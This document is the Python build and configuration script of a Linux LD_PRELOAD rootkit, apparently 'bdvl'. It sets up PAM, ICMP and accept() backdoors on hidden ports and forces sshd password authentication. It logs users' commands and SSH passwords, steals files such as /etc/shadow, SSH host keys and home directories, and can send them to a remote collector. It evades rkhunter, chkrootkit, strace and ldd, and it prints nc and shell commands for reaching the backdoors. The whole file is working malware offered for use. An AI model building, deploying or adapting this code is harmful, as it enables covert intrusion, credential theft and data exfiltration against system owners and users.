#!/usr/bin/env python


# 'can be disabled' means by setting the appropriate value to
# None the certain functionality will be disabled in the rootkit.
# (if it's a list you can also remove everything from the list)


# BACKDOOR SETTINGS

BACKDOOR_PASS = None  # password for all doors. set to None = random

USE_PAM_BD = True
PAM_UNAME  = None  # set to None = random

# accept() backdoor. allows backdoor access via infected services on the box.
# must have a dedicated port number for this. dedicated port cannot be used for other stuff.
# dedicated port is written to the hide_ports file. so it can be changed...whatever port is
# on the first line of hide_ports is always the port for the accept door...
USE_ACCEPT_BD = True
ACCEPT_PORT   = None   # set to None = random

# packets received from nonhidden ports are ignored.
# the backdoor's normal behaviour is to select the first (default) interface it finds.
# if you need to you can instead specify one with TARGET_INTERFACE.
USE_ICMP_BD      = True
TARGET_INTERFACE = None
# if you change these remember to update etc/icmp.sh with the new values.
MAGIC_ID  = 0xb10f
MAGIC_SEQ = 0xc4de
MAGIC_ACK = 0xc500

NUM_HIDDEN_PORTS = 2     # no. of random port numbers to be hidden by default. they are displayed during setup & installation.
CUSTOM_PORTS     = []    # specify ports here if you'd rather choose.
HIDDEN_IP_ADDRS  = []    # ipv4 addresses in this list will be hidden. (hide all connections from a specific source) keeping empty disables in the kit.

# END OF BACKDOOR SETTINGS


# the following settings are for patching of /etc/ssh/sshd_config to make sure that our PAM backdoor stays accessible.
# SSHD_PATCH_HARD is the original method. this method makes sure the file itself stays the way we want.
# SSHD_PATCH_SOFT is the better method. when sshd is reading sshd_config, it reads what we say it should read.
SSHD_PATCH_HARD = False
SSHD_PATCH_SOFT = True
PATCH_TARGETS = ['PasswordAuthentication', 'UsePAM']  #  target settings to keep on top of...
ANTIVAL       = ['no', 'no']          # what they shouldn't/can't be.
TARGETVAL     = ['yes', 'yes']        # what they will be now.


# maximum possible magic ID values based on the appropriate data types...
# modern systems handle unsigned ints for ids just fine. only one can be True.
GID_TYPE = {
    4294967294:True,             # unsigned int,
    65534:False,                 # unsigned short,
    18446744073709551614:False,  # unsigned long (???),
    #'1234':True,                # custom
}
READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (20 min)
GID_CHANGE_MINTIME = 60 * 20


HIDE_MY_ASS      = True     # keep track of hidden things created by yourself that don't belong to the rootkit. works recursively. initially was for rehiding upon a GID change.
UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS. also works recursively.
CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when not logged into the box. (when no rootkit processes or hidden ports are alive)


LOG_USER_EXEC  = True          # log stuff executed by users. from the moment of installation. straight from the exec hooks.
LOG_LOCAL_AUTH = True          # log successful auths for users on the box.
LOG_SSH        = True          # log outgoing ssh login attempts.
LOG_FMT        = '%s (%s)\\n'  # format is '<(ssh )user(@host)> (<password>)\n'
MAX_LOGS_SIZE   = (1024 * 1024) * 100  # don't store more than 100mb of logs per log type. can be disabled.


# START OF FILE STEALING STUFF.

FILE_STEAL = True  # if False then nothing below will apply.

# you can also specify paths. wildcards apply..
INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host_*_key*',
                      'known_hosts', 'authorized_keys', '*.txt', '*.sql', '*.php', '*.zip',
                      '*.tar', '*.tar.*', '*.rar']

# all files in these directories will be stolen when opened. can be disabled.
INTERESTING_DIRECTORIES = ['/root', '/home']

# instead of storing files in our hidden directory on the box, prioritise sending them here...
# see etc/hoarder. format for this is ip:port - can be changed after installation... (can be disabled/is disabled by default)
STOLEN_STORAGE = ''
NO_DISK_WRITE  = False # if True & the file can't be sent for whatever reason, the file will not be copied into the hidden directory.

# when stealing files ignore these filenames. wildcards apply. can be disabled. is by default.
NAMES_BLACKLIST = []

MAX_FILE_SIZE      = (1024 * 1024 * 1024) * 2   # don't try to steal files bigger than 2gb. file contents are mapped into memory & written in a new background process.
FILE_CLEANSE_TIMER = (60 * 60) * 12         # remove stolen files every 12 hours. you may want to change this value...can be disabled.

# this will limit how much stuff can be stored at one time. target files that would put the current total stolen size over this value
# will not be stolen. if SYMLINK_FALLBACK is True then a link will be created in lieu of the copied file. cap of 10gb by default. can be disabled.
MAX_STEAL_SIZE = (1024 * 1024 * 1024) * 10

# if mapping the file contents fails, use the original method of reading & writing in blocks.
ORIGINAL_RW_FALLBACK = True

# when a. copying the file fails
#     (b. it exceeds MAX_FILE_SIZE)
#     (c. MAX_STEAL_SIZE has been reached)
# link it instead of copying it.
SYMLINK_FALLBACK = True

# chmod the new copy with the target's mode when finished writing it.
KEEP_FILE_MODE = False

# don't write copies of target files. make only symlinks to them.
SYMLINK_ONLY = False

# END OF FILE STEALING STUFF


# patch the dynamic linker libraries as to overwrite the original /etc/ld.so.preload path with our own.
# setting to False will instruct the rootkit to use /etc/ld.so.preload instead.
PATCH_DYNAMIC_LINKER = True


# block size settings for reading target files & writing their copies. (a few things use these values)
BLOCKS_COUNT   = 10         # the default value for how many chunks files contents will be divided into.
MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 32k default. can be disabled.




# SETUP SETTINGS
PRINT_ALL_SETTINGS = False

# 'REWRITE_' thingies are permanent. disable them after stuff has been rewritten!

# if there have been changes to etc/.bashrc enable this.
# written to inc/util/bashrc.h.
REWRITE_BASHRC = False

# if there have been changes to etc/.rolf enable this.
# written to inc/util/magic/rolf.h.
REWRITE_ROLF = False
# END OF SETUP.PY SETTINGS



# other random stuff

# bdvl will unset these environment variables in its processes.
unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND']

# valid package managers available from `./bdv <pkgman>`
validpkgmans = ['apt', 'yum', 'pacman', 'emerge']

# things to hide from. the rootkit is uninstalled during the runtime of either,
#    a. processes with certain environment variables set,
#    b. processes that need to access certain paths,
#    c. or just processes whose names match those below.
scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']
scary_paths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*',
               '*/*ld-*.so', '*ld-*.so', '*/ld-*.so.*']
scary_procs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide', 'rkhunter',
               'chkproc', 'chkdirs', 'ltrace','strace']

# valid platforms for target shared object when installing. (`./bdvinstall [path]...`)
valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']




from crypt import crypt
from shutil import copy
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from os import listdir, system, unlink, mkdir
from os.path import basename, isdir, exists
from binascii import hexlify

alowercase, auppercase = ascii_lowercase, ascii_uppercase





class Hooks():
    def __init__(self):
        with open(HOOKS_PATH, 'r') as fd:
            self.contents = fd.read().split('\n')
            self.contents = [c for c in self.contents if c and not c[0]=='#']
            fd.close()

        self.ALL_HOOKS = []

    def readhooks(self, allhooks=''):
        for line in self.contents:
            curtoks = line.split(':')
            targetlib = curtoks[0]
            targetsym = curtoks[1]

            hooktoks = targetsym.split(',')
            for curhook in hooktoks:
                self.ALL_HOOKS.append(curhook)

            newarr = CArray(targetlib, hooktoks)
            allhooks += newarr.create()
        return allhooks


class Magical():
    def __init__(self):
        self.idmin   = None
        self.idmax   = None
        self.magicid = None

    def magicmin(self):
        self.idmin = int(self.idmax>>5)
        return self.idmin

    def magicmax(self):
        if not self.idmax == None:
            return self.idmax

        keys = list(GID_TYPE.keys())
        vals = list(GID_TYPE.values())

        for i in range(len(GID_TYPE)):
            if vals[i] == True and not self.idmax == None:
                print('Only one data type for the magic GID can be selected.')
                quit()

            if vals[i] == True:
                self.idmax = keys[i]

        return self.idmax

    def maGicalID(self):
        if not self.magicid == None:
            return self.magicid

        if self.idmax == None:
            print('Could not get maximum magic GID. Did you select one?')
            quit()

        try: # python3 is capable of this.
            self.magicid = choice(range(self.idmin, self.idmax))
        except: # python2 is not.
            newmax = self.idmin+500
            self.magicid = choice(range(self.idmin, newmax))

        return self.magicid



class Definitions():
    def __init__(self, alist):
        self.array_list = alist
        self.list_len = len(alist)

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, val)
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        rlnam = nam.upper()
        ident = '#define C{0} {1}\n'
        ident = ident.format(rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    def getidents(self):
        idents = '/*  IDENTS  */\n'
        for i in range(self.list_len):
            our_name = self.array_list[i]
            idents += self.getident(our_name, i)
        return idents+'\n\n'


# handy class. trusty class. thank you class.
class CArray(): # default is assumed to be an array of char pointers
    def __init__(self, name, alist, arrtype='char*'):
        self.name = name
        self.sizen = name.upper() + '_SIZE'
        self.list_len = len(alist)
        self.array_list = alist
        self.arrtype = arrtype

        self.typeformat = 'static {0} const {1}[{2}] = '

    # define size of the array to be created.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.sizen, self.list_len)
        return size_def

    def declarearray(self):
        return self.typeformat.format(self.arrtype, self.name, self.sizen)

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.array_list:
            elems += '"{0}",'.format(elem)   \
            if self.arrtype == 'char*'       \
            else '{0},'.format(elem)
        elems = elems[:-1] + '};\n'
        return elems

    # create full C array.
    def create(self):
        result = '/*   {0}   */\n'.format(self.name)
        result += self.getsizedef()
        result += self.declarearray()
        result += self.buildelems()
        return result+'\n'


class Util():
    def __init__(self):
        self.usedpaths = []

        # the root directories of where our stuff will reside. see Util.randpath.
        self.rootdirs = ['/bin', '/etc', '/lib']

    # hex the contents of a path & return it as a char array.
    def hexarraylifypath(self, path, arrname):
        fd = open(path, 'rb')
        contents = fd.read()
        fd.close()

        contentshex = hexlify(contents)
        contentslist = ['0x'+str(contentshex[i:i+2].decode('utf-8')) for i in range(0, len(contentshex), 2)]
        contentsarr = CArray(arrname, contentslist, arrtype='char')
        return contentsarr.create()

    def sogetname(self, instdir):
        return 'lib'+basename(instdir)+'.so'

    def randgarb(self, garbset, garblen):
        garb = ''.join(choice(garbset) for _ in range(garblen))
        return garb

    def randport(self):
        return choice(range(9362, 65535))

    def randports(self, c):
        rports = []
        for i in range(c):
            rports.append(self.randport())
        return rports

    def cryptpw(self, plain):
        salt = self.randgarb(auppercase+alowercase+digits, 16)
        hashd = crypt(plain, "$6$"+salt)
        return hashd

    def checkthing(self, thing):
        if not thing == None and not len(thing) == 0:
            return True
        return False

    def getpathroot(self):
        basedirs = self.rootdirs
        randroot = choice(basedirs)
        if not isdir(randroot):
            return self.getpathroot()

        dirlist = listdir(randroot)
        if(len(dirlist) == 0):
            return self.getpathroot()

        randdir = choice(dirlist)
        return randroot+'/'+randdir

    def randpath(self, maxlen):
        randdir = self.getpathroot()

        while len(randdir) < maxlen:
            randdir += self.randgarb(alowercase, 1)

        while len(randdir) > maxlen:
            randdir = randdir[:-1]

        randdir = randdir[:-1] + self.randgarb(alowercase, 1)

        if randdir in self.usedpaths or '.' in randdir:
            randdir = self.randpath(maxlen)
        else:
            self.usedpaths.append(randdir)

        return randdir




# bunch of settings related stuff...
ut, m = Util(), Magical()

PAM_UNAME = ut.randgarb(alowercase, 7) if PAM_UNAME == None else PAM_UNAME
BACKDOOR_PASS = ut.randgarb(alowercase+auppercase+digits, 12) if BACKDOOR_PASS == None else BACKDOOR_PASS
ACCEPT_PORT = ut.randport() if ACCEPT_PORT == None and USE_ACCEPT_BD == True else ACCEPT_PORT

if NUM_HIDDEN_PORTS <= 0 and len(CUSTOM_PORTS) == 0:
    print('NUM_HIDDEN_PORTS must be >0.')
    print('Specify CUSTOM_PORTS if that is what you are after.')
    quit()
else:
    if len(CUSTOM_PORTS) == 0: BDVLPORTS = ut.randports(NUM_HIDDEN_PORTS)
    else: BDVLPORTS = CUSTOM_PORTS
if USE_ACCEPT_BD == True: BDVLPORTS.insert(0, ACCEPT_PORT)

MAX_GID, MIN_GID, MAGIC_GID = m.magicmax(), m.magicmin(), m.maGicalID()
INSTALL_DIR = ut.randpath(14)
BDVLSO = ut.sogetname(INSTALL_DIR)
CLEANEDTIME_PATH = ut.randpath(12) if not FILE_CLEANSE_TIMER == None else None

INC        = 'inc'
CONFIGH    = INC + '/config.h'
HOOKS_PATH = INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.

BDVLH = INC + '/bdv.h'
SETTINGS = { # all of these are written to bdv.h. if a value is None it is skipped.
    'PAM_UNAME':PAM_UNAME,                   'BACKDOOR_PASS':ut.cryptpw(BACKDOOR_PASS),
    'MAGIC_GID':MAGIC_GID,                   'BD_VAR':ut.randgarb(auppercase, 16),
    'INSTALL_DIR':INSTALL_DIR,               'HOMEDIR':ut.randpath(17),
    'BDVLSO':BDVLSO,                         'PRELOAD_FILE':ut.randpath(18),
    'SSH_LOGS':ut.randpath(14),              'INTEREST_DIR':ut.randpath(17),
    'HIDEPORTS':ut.randpath(17),             'GID_PATH':ut.randpath(15),
    'GIDTIME_PATH':ut.randpath(16),          'SSHD_CONFIG':'/etc/ssh/sshd_config',
    'LOG_PATH':ut.randpath(15),              'ASS_PATH':ut.randpath(16),
    'MAX_FILE_SIZE':MAX_FILE_SIZE,           'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
    'CLEANEDTIME_PATH':CLEANEDTIME_PATH,     'OLD_PRELOAD':'/etc/ld.so.preload',
    'BLOCKS_COUNT':BLOCKS_COUNT,             'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE,
    'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME, 'LOG_FMT':LOG_FMT,
    'MAX_STEAL_SIZE':MAX_STEAL_SIZE,         'MAX_GID':MAX_GID,
    'MIN_GID':MIN_GID,                       'TARGET_INTERFACE':TARGET_INTERFACE,
    'MAGIC_ID':MAGIC_ID,                     'MAGIC_SEQ':MAGIC_SEQ,
    'MAGIC_ACK':MAGIC_ACK,                   'EXEC_LOGS':ut.randpath(17),
    'HIDEADDRS':ut.randpath(16),             'MAX_LOGS_SIZE':MAX_LOGS_SIZE,
    'STOLESTORE_PATH':ut.randpath(17)
}

# the following paths are linked to within the installation directory.
# & removed when we aren't logged into the box.
LINKPATHS = {
    SETTINGS['SSH_LOGS']:'ssh_logs',           SETTINGS['HIDEPORTS']:'hide_ports',
    SETTINGS['INTEREST_DIR']:'interest_dir',   SETTINGS['LOG_PATH']:'auth_logs',
    SETTINGS['ASS_PATH']:'my_ass',             SETTINGS['INSTALL_DIR']:'install_dir',
    SETTINGS['EXEC_LOGS']:'exec_logs',         SETTINGS['HIDEADDRS']:'hide_addrs',
    SETTINGS['STOLESTORE_PATH']:'stolen_store'
}

# these must be checked & based on the values, subsequently written to config.h
# so that the kit knows what stuff to do & what not to do.
CHECKTHESE = {
    'SSHD_PATCH_HARD':SSHD_PATCH_HARD,           'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,         'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
    'LOG_SSH':LOG_SSH,                           'FILE_STEAL':FILE_STEAL,
    'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,           'SYMLINK_FALLBACK':SYMLINK_FALLBACK,
    'UNINSTALL_MY_ASS':UNINSTALL_MY_ASS,         'SSHD_PATCH_SOFT':SSHD_PATCH_SOFT,
    'PATCH_DYNAMIC_LINKER':PATCH_DYNAMIC_LINKER, 'KEEP_FILE_MODE':KEEP_FILE_MODE,
    'SYMLINK_ONLY':SYMLINK_ONLY,                 'USE_PAM_BD':USE_PAM_BD,
    'USE_ICMP_BD':USE_ICMP_BD,                   'HIDE_MY_ASS':HIDE_MY_ASS,
    'USE_ACCEPT_BD':USE_ACCEPT_BD,               'LOG_USER_EXEC':LOG_USER_EXEC,
    'ORIGINAL_RW_FALLBACK':ORIGINAL_RW_FALLBACK, 'HIDE_ADDRS':ut.checkthing(HIDDEN_IP_ADDRS),
    'NO_DISK_WRITE':NO_DISK_WRITE
}

# paths here suffixed with a '/' are treated as directories by the rootkit.
# upon logging into the backdoor, if these paths do not exist they are created.
# this saves auto.sh some work. stuff here is also rehidden on GID changes.
BDVLPATHS = {
    SETTINGS['SSH_LOGS']:LOG_SSH,              SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER, SETTINGS['LOG_PATH']:LOG_LOCAL_AUTH,
    SETTINGS['ASS_PATH']:HIDE_MY_ASS,          SETTINGS['INTEREST_DIR']+'/':FILE_STEAL,
    SETTINGS['EXEC_LOGS']+'/':LOG_USER_EXEC
}

NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
    '/proc':True, '/root':True, '/tmp':True,
    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,   SETTINGS['INSTALL_DIR']:True,
    SETTINGS['PRELOAD_FILE']:True,             SETTINGS['OLD_PRELOAD']:True,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER, SETTINGS['HIDEPORTS']:True,
    SETTINGS['SSH_LOGS']:LOG_SSH,              SETTINGS['INTEREST_DIR']:FILE_STEAL,
    SETTINGS['HOMEDIR']:True,                  SETTINGS['ASS_PATH']:True,
    SETTINGS['CLEANEDTIME_PATH']:True,         SETTINGS['EXEC_LOGS']:LOG_USER_EXEC,
    SETTINGS['HIDEADDRS']:ut.checkthing(HIDDEN_IP_ADDRS)
}

PATCHLISTS = { # stuff for ldpatch
    'patchtargets':PATCH_TARGETS, 'antival':ANTIVAL, 'targetval':TARGETVAL
}


def checktoggles(keys, values):
    okhere=''
    for i in range(len(keys)):
        okhere += '#define {0}\n'.format(keys[i]) \
        if values[i] == True else ''
    return okhere

def writecfg():
    KEYS, VALUES = list(CHECKTHESE.keys()), list(CHECKTHESE.values())
    with open(CONFIGH, 'a') as fd:
        fd.write(checktoggles(KEYS, VALUES))
        fd.close()


def listconditional(dictlist):
    goodkeys = []
    keys, values = list(dictlist.keys()), list(dictlist.values())
    for i in range(len(keys)):
        if values[i] == True:
            goodkeys.append(keys[i])
    return goodkeys



def setup_config():
    copy(CONFIGH+'.bak', CONFIGH)
    writecfg()

    h = Hooks()
    gotbdvlh = h.readhooks()

    # get all settings & values for bdv.h
    KEYS, VALUES = list(SETTINGS.keys()), list(SETTINGS.values())
    for settingi in range(len(SETTINGS)):
        target, value = KEYS[settingi], VALUES[settingi]
        skip = False
        togpathkeys = list(BDVLPATHS.keys())
        togpathvals = list(BDVLPATHS.values())
        for key in togpathkeys:
            if value == key and BDVLPATHS[key] == False:
                skip = True
                break

        if value == None or skip == True:
            continue

        if PRINT_ALL_SETTINGS == True:
            print('\033[1;31m{0}\033[0m: {1}'.format(target, value))

            gotbdvlh += '/*  {0}  */\n'.format(target)
        try:
            gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
        except:
            gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
        gotbdvlh += '#define LEN_{0} {1}\n\n'.format(target, len(str(value)))

    gotbdvlh += '#define MGIDSTR "{0}"\n'.format(str(MAGIC_GID))

    defs = Definitions(h.ALL_HOOKS)
    gotbdvlh += defs.getidents()

    if FILE_STEAL == True:
        intfilsarr = CArray('interesting_files', INTERESTING_FILES)
        gotbdvlh += intfilsarr.create()

        if not INTERESTING_DIRECTORIES == None and not len(INTERESTING_DIRECTORIES) == 0:
            gotbdvlh += '#define DIRECTORIES_TOO\n'
            intdirsarr = CArray('interesting_directories', INTERESTING_DIRECTORIES)
            gotbdvlh += intdirsarr.create()
        if len(NAMES_BLACKLIST) > 0 and not NAMES_BLACKLIST == None:
            gotbdvlh += '#define BLACKLIST_TOO\n'
            namesarr = CArray('namesblacklist', NAMES_BLACKLIST)
            gotbdvlh += namesarr.create()

        if not STOLEN_STORAGE == None and not len(STOLEN_STORAGE) == 0:
            gotbdvlh += '#define STOLEN_STORAGE "{0}"\n'.format(STOLEN_STORAGE)

    linksrc = list(LINKPATHS.keys())
    linkdest = list(LINKPATHS.values())

    bdvlarrays = { # write all of these lists to bdv.h as arrays of char pointers
        'linksrcs':linksrc,                 'linkdests':linkdest,
        'unsetvars':unsetvars,              'bdvpaths':listconditional(BDVLPATHS),
        'notrack':listconditional(NOTRACK), 'validpkgmans':validpkgmans,
        'scary_variables':scary_variables,  'scary_paths':scary_paths,
        'scary_procs':scary_procs,          'valid_platforms':valid_platforms,
        'all':h.ALL_HOOKS
    }

    arraynames = list(bdvlarrays.keys())
    targetarrays = list(bdvlarrays.values())
    for i in range(len(arraynames)):
        thisarr = CArray(arraynames[i], targetarrays[i])
        gotbdvlh += thisarr.create()+'\n'

    bdvlportsarr = CArray('bdvlports', BDVLPORTS, arrtype='int')
    gotbdvlh += bdvlportsarr.create()
    if USE_ACCEPT_BD == True: BDVLPORTS.remove(ACCEPT_PORT)

    if not HIDDEN_IP_ADDRS == None and not len(HIDDEN_IP_ADDRS) == 0:
        addrslist = CArray('hideipaddrs', HIDDEN_IP_ADDRS)
        gotbdvlh += addrslist.create()

    if SSHD_PATCH_SOFT == True or SSHD_PATCH_HARD == True:
        patchkeys, patchvals = list(PATCHLISTS.keys()), list(PATCHLISTS.values())
        for i in range(len(patchkeys)):
            thisarr = CArray(patchkeys[i], patchvals[i])
            gotbdvlh += thisarr.create()

    # done.
    with open(BDVLH, 'w') as fd:
        fd.write(gotbdvlh)
        fd.close()
    with open('build/{0}.h'.format(PAM_UNAME), 'w') as fd:
        fd.write(gotbdvlh)
        fd.close()

    # mk tar.gz of include dir. b64 it. rm it.
    system('tar cpfz ./build/{0}.tar.gz {1}/'.format(PAM_UNAME, INC))
    with open('./build/'+PAM_UNAME+'.tar.gz', 'rb') as fd:
        targzb64 = b64encode(fd.read())
        fd.close()
    unlink('./build/'+PAM_UNAME+'.tar.gz')
    
    # write b64.
    with open('./build/'+PAM_UNAME+'.b64', 'wb') as fd:
        fd.write(targzb64)
        fd.close()

def rewritethings():
    if REWRITE_BASHRC == True:
        basharr = ut.hexarraylifypath('etc/.bashrc', 'rkbashrc')
        with open(INC+'/util/magic/bashrc.h', 'w') as fd:
            fd.write(basharr)
            fd.close()

    if REWRITE_ROLF == True:
        with open('etc/.rolf', 'r') as fd:
            rolf = fd.read().strip().split('\n')
            fd.close()
        rolfarr = CArray('rolfs', rolf)
        with open(INC+'/util/magic/rolf.h', 'w') as fd:
            fd.write(rolfarr.create())
            fd.close()



if __name__ == '__main__':
    if exists(CONFIGH):
        print('Config header ({0}) already exists. Not doing setup again.'.format(CONFIGH))
        quit()

    rewritethings()
    setup_config()

    print('')
    print('Hidden port(s): ' + str(BDVLPORTS))
    print('Magic environment variable: ' + SETTINGS['BD_VAR'])
    p = '   \033[1;31mPassword:\033[0m {0}\n'.format(BACKDOOR_PASS)
    shells = p
    print('\n'+p)
    if USE_PAM_BD == True:
        template = 'sh etc/ssh.sh {0} <host> {1}'.format(PAM_UNAME, choice(BDVLPORTS))
        p = '   \033[1;31mPAM:\033[0m {0}\n'.format(template)
        shells += p
        print(p)
    if USE_ICMP_BD == True:
        template = 'sh etc/icmp.sh <host> {0}'.format(choice(BDVLPORTS))
        p = '   \033[1;31mICMP:\033[0m {0}\n'.format(template)
        shells += p
        print(p)
    if USE_ACCEPT_BD == True:
        template = 'nc <host> 22 -p {0}'.format(ACCEPT_PORT)
        p = '   \033[1;31mACCEPT:\033[0m {0}\n'.format(template)
        shells += p
        print(p)

    newshells = './build/{0}.txt'.format(PAM_UNAME)
    with open(newshells, 'w') as fd:
        fd.write(shells)
        fd.close()
